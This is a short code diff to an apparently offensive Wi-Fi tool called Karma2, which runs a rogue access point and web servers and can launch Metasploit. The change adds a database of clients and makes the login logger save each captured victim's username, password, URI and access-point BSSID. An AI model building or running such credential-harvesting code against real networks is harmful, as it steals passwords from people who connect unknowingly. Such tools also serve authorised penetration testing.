@@ -23,6 +23,8 @@ from src.Webserver import *
 from src.AccessPoint import *
 from src.AdminWebserver import *
 from src.Utils import *
+from src.Database import ClientsDatabase
+from src.ServiceGuessr import ServiceGuessr
 
 #CERTFILE='./certs/fullchain.pem'
 #KEYFILE='./certs/privkey.pem'
@@ -104,6 +106,11 @@ class Karma2:
     if args.metasploit is not None:
       self.start_metasploit(args.metasploit)
   
+    self.db = ClientsDatabase()
+    self.db.start()
+
+    self.guessr = ServiceGuessr(self)
+
   def log_login(self, client, user):
     client_ap = self.get_client_ap(client)
     bssid = None
@@ -117,7 +124,9 @@ class Karma2:
     if bssid is not None:
       user['bssid'] = bssid
       self.update_login({'login':user})
-  
+    
+    self.db.new_client_credentials(user['login'], user['password'], user['uri'], bssid)
+
   def log(self, message):
     log(message)
   
